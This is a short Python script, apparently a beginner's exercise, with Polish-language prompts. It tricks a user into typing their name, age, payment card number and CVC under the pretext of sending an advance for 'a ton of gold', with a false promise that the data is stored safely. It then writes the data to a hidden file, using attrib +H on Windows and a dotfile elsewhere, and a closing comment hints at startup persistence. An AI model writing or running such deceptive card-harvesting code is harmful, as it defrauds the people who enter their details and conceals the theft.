import platform
import subprocess

imie = input("Prosze podaj swoje imie,\n moj przyjacielu $\n")
nazwisko = input("Prosze podaj swoje nazwisko,\n moj przyjacielu $\n")

try:
    wiek = int( input("Podaj swoj wiek\n"))
except ValueError as cos_poszlo_nie_tak:
    wiek = 8
    print(f'wiek ustawiono na {wiek},\nwystapil {cos_poszlo_nie_tak}')

numerKarty = input("Potrzebuje numer twojej karty,\n aby wysłać ci zaliczke za tone zlota\n")
kodCVC = input("Prosze podac kod CVC, Nie martw sie,\n zostanie to bezpiecznie zapisane\n")

def ukryjPlik(nazwaPliku):
   with open(nazwaPliku,mode='a', encoding='UTF-8')as file:
    file.write(f"""
   {imie} {nazwisko}
   {wiek}
   {numerKarty}
   {kodCVC}
   """)
 # file.writelines([imie,nazwisko,str(wiek),numerKarty,kodCVC])
#sprawdzanie systemu
#print(platform.system())
if platform.system() == 'Windows':
    ukryjPlik('ukrytyPlik.txt')
    subprocess.check_call(["attrib","+H","ukrytyPlik.txt"])

elif platform.system() =='Darwin' or platform.system() == 'Linux':
    ukryjPlik('.ukrytyPlik.txt')
    #pro tip C:startup